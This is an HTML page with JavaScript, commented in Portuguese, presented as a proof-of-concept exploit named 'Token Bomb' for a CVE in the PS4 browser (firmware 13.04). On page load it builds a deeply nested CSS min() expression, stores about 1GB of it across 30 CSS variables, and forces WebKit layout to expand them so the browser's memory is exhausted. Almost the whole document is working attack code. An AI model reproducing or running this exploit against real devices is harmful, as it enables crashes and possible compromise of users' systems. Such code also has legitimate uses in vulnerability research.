<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2025-43535 — Token Bomb</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .warn{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<div>CVE-2025-43535 · Token Bomb · PS4 FW 13.04</div>
<div id="log"></div>
<div id="stage" style="visibility:hidden"></div>

<script>
"use strict";

const L = (m, c) => {
  const d = document.getElementById('log');
  d.innerHTML += `<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop = d.scrollHeight;
};

// Constrói a árvore de profundidade N (C22 = ~36MB)
function buildDepth(depth) {
  let e = '1px';
  for (let d = 1; d <= depth; d++) {
    e = 'min(' + e + ',' + e + ')';
  }
  return e;
}

async function run() {
  L('Iniciando Tática de Bomba de Variáveis (Token Stream)...', 'warn');

  // 1. Gera o bloco C22. O JS usa no máximo ~70MB aqui e estabiliza.
  L('Construindo o bloco base C22 no JS (~36MB)...', 'info');
  let c22;
  try {
    c22 = buildDepth(22);
    L(`Bloco C22 gerado. Memória JS segura.`, 'ok');
  } catch(e) {
    L('Erro ao gerar C22: ' + e, 'fail');
    return;
  }

  // Vamos injetar 30 variáveis de 36MB = 1080MB (Acima da tua marca de 1026MB)
  const totalChunks = 30;
  L(`A armazenar ${totalChunks} variáveis CSS no motor C++...`, 'warn');

  for (let i = 1; i <= totalChunks; i++) {
    // setProperty guarda o valor como "texto não parseado" no C++. Zero stress de processamento.
    document.documentElement.style.setProperty(`--chunk${i}`, c22);
    
    // Dá um frame de respiro para a interface não travar
    await new Promise(r => requestAnimationFrame(r));
  }

  L('1.08GB de tokens matemáticos injetados na raiz do documento!', 'ok');

  // 2. Destruímos o C22 do JavaScript para devolver toda a RAM possível ao PS4
  L('A apagar a string do JavaScript para máxima RAM livre...', 'info');
  c22 = null; 
  
  // Aguardamos 1.5s para o Garbage Collector do JS limpar a casa
  await new Promise(r => setTimeout(r, 1500)); 

  // 3. Montamos o gatilho final. A string no JS fica minúscula: "min(var(--chunk1), var(--chunk2)...)"
  L('A construir a ligação detonadora...', 'warn');
  let trigger = 'min(';
  for (let i = 1; i <= totalChunks; i++) {
    trigger += `var(--chunk${i})`;
    if (i < totalChunks) trigger += ', ';
  }
  trigger += ')';

  // Criamos o elemento e aplicamos o gatilho na propriedade width
  const el = document.createElement('div');
  el.style.position = 'absolute';
  el.style.width = trigger;
  document.getElementById('stage').appendChild(el);

  L('Gatilho armado na propriedade "width". Preparar para o impacto...', 'crash');

  // 4. A DETONAÇÃO
  setTimeout(() => {
    try {
      // Quando pedimos o offsetWidth, o WebKit tem de invocar as 30 variáveis 
      // simultaneamente e expandi-las em > 125 milhões de nós na memória C++.
      // É a recriação perfeita da entrega de 1GB do servidor!
      void el.offsetWidth; 
      
      L('Sobreviveu. O PS4 aguentou a expansão dos tokens.', 'fail');
    } catch(e) {
      L('Falha no layout: ' + e, 'fail');
    }
  }, 1000);
}

window.addEventListener('load', () => setTimeout(run, 500));
</script>
</body>
</html>
